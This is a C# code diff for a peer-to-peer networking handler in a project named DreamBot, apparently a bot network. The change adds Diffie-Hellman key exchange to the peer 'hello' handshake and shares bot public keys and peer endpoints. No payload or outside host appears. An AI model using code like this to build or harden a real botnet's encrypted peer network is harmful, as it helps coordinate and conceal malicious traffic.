@@ -1,5 +1,6 @@
 using System;
 using System.Diagnostics;
+using DreamBot.Crypto;
 using DreamBot.Network.Protocol.Messages;
 using DreamBot.Network.Protocol.Messages.System;
 using DreamBot.Network.Protocol.Peers;
@@ -21,13 +22,17 @@ namespace DreamBot.Network.Protocol.Handlers
         {
             var msg = botMessage.Message as HelloMessage;
             var endpoint = botMessage.Header.EndPoint;
-            if (_peerList.TryRegister(new PeerInfo(botMessage.Header.BotId, endpoint)))
+
+            var peerInfo = new PeerInfo(botMessage.Header.BotId, endpoint);
+            if (_peerList.TryRegister(peerInfo))
             {
+                peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);
                 var endpoints = _peerList.GetPeersEndPoint();
                 var bestEndpoints = endpoints.GetRange(0, Math.Min(3, endpoints.Count));
 
                 var reply = new HelloReplyMessage {
                     BotVersion = 1,
+                    PublicKey = BotIdentifier.PublicKey,
                     Peers = bestEndpoints.ToArray(),
                 };
                 _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);
